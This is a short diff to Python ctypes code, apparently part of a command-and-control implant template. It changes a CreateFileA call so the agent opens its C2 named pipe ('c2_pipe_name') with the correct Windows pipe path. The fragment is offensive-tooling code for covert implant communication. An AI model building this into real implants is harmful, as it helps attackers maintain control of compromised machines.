@@ -53,7 +53,7 @@ def open_handle():
     SECURITY_SQOS_PRESENT = 0x100000
     SECURITY_ANONYMOUS = 0x0
     while 1:
-        pipe_handle = windll.kernel32.CreateFileA(```[var:::c2_pipe_name]```,
+        pipe_handle = windll.kernel32.CreateFileA("\\\\.\\pipe" + ```[var:::c2_pipe_name]```,
                                                   GENERIC_READ|GENERIC_WRITE,
                                                   c_int(0),
                                                   None,
